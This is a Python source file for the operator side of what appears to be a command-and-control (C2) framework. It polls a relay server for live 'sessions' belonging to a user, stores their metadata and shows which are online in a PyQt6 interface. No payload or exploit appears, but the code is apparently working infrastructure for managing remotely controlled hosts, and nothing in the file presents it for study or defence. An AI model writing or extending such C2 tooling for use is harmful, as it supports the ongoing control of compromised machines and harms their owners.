# c2_server.py (Definitive, Unified, with Diagnostics)
import threading, time, requests
from PyQt6.QtCore import QObject, pyqtSignal
from config import RELAY_URL
import json

class C2Server(QObject):
    sessions_updated = pyqtSignal(dict)
    
    def __init__(self, db_manager):
        super().__init__()
        self.db = db_manager
        self.sessions = {}
        self._is_running = False

    def start(self, username):
        self.c2_user = username
        self.sessions = self.db.load_all_sessions_for_user(self.c2_user)
        for sid in self.sessions: self.sessions[sid]['status'] = 'Offline'
        self.sessions_updated.emit(self.sessions)
        
        self._is_running = True
        self.poll_thread = threading.Thread(target=self.poll_relay, daemon=True)
        self.poll_thread.start()

    def stop(self):
        self._is_running = False

    def poll_relay(self):
        while self._is_running:
            try:
                url = f"{RELAY_URL}/c2/discover_sessions/{self.c2_user}"
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    try:
                        live_data = response.json().get("sessions", {})
                        # --- DIAGNOSTIC PRINT ---
                        print(f"[C2 Client] Polled relay. Received {len(live_data)} live session(s): {json.dumps(live_data)}")
                        
                        live_ids = set(live_data.keys()); cached_ids = set(self.sessions.keys()); ui_update_needed = False
                        new_sessions = live_ids - cached_ids
                        for session_id in new_sessions:
                            self.sessions[session_id] = live_data[session_id]; self.db.save_session_metadata(self.c2_user, session_id, self.sessions[session_id]); ui_update_needed = True
                        for session_id in list(self.sessions.keys()):
                            current_status = self.sessions[session_id].get('status', 'Offline')
                            if session_id in live_ids:
                                if current_status != 'Online': self.sessions[session_id]['status'] = 'Online'; ui_update_needed = True
                            else:
                                if current_status != 'Offline': self.sessions[session_id]['status'] = 'Offline'; ui_update_needed = True
                        if ui_update_needed: self.sessions_updated.emit(self.sessions)
                    except json.JSONDecodeError:
                        print(f"[C2 Client] ERROR: Failed to decode JSON from relay server. Response: {response.text}")

            except requests.RequestException as e:
                print(f"[C2 Client] ERROR: Could not connect to relay server: {e}")
            
            time.sleep(5)